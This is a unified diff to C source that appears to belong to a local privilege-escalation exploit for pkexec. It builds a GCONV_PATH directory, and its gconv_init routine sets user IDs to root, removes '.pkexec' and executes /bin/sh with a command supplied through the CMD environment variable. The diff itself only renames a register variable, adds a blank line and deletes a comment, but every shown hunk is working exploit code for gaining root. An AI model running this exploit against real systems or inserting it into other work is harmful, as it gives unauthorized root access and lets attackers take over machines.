@@ -42,10 +42,10 @@ void entry()
     char *cmd;
     int argc;
     char **argv;
-    register unsigned long *rsp asm ("rbp");
+    register unsigned long *rbp asm ("rbp");
 
-    argc = *(int *)(rsp+1);
-    argv = (char **)rsp+2;
+    argc = *(int *)(rbp+1);
+    argv = (char **)rbp+2;
 
     res = mkdir("GCONV_PATH=.", 0777);
     if (res == -1 && errno != EEXIST)
@@ -121,6 +121,7 @@ void gconv_init()
 {
     close(2);
     dup2(1, 2);
+
     char *cmd = getenv("CMD");
 
     setresuid(0, 0, 0);
@@ -129,7 +130,6 @@ void gconv_init()
     rmrf(".pkexec");
 
     if (cmd) {
-        // In case interactive bash was not possible
         execve("/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL);
     } else {
         // Try interactive bash first
